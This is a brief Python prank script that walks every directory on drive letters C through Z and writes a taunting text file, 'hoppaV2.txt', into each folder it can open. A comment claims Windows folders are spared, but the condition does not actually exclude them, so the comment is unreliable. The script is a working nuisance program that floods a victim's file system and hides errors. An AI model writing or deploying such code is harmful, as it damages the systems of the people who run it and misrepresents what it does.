import os

possibleDiskNames = ['c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
pathsDone = []

hoppaCounter = 0
for diskName in possibleDiskNames:
    if os.path.exists("%s:/" %diskName):
        for path, dirs, files in os.walk("%s:/" %diskName):
            hoppaPath = os.path.join(path, "hoppaV2.txt")
            if "windows" in hoppaPath.lower() or hoppaPath not in pathsDone: # i'm not putting it in windows folders because i'm not a monster
                try:
                    with open(hoppaPath, "w") as hoppaFile:
                        hoppaFile.write("hoppa, You're fucked\ngood luck\nkusjes Sem")
                        pathsDone.append(hoppaPath)
                        hoppaCounter+= 1
                except:
                    pass
                
print(hoppaCounter)
input()
            
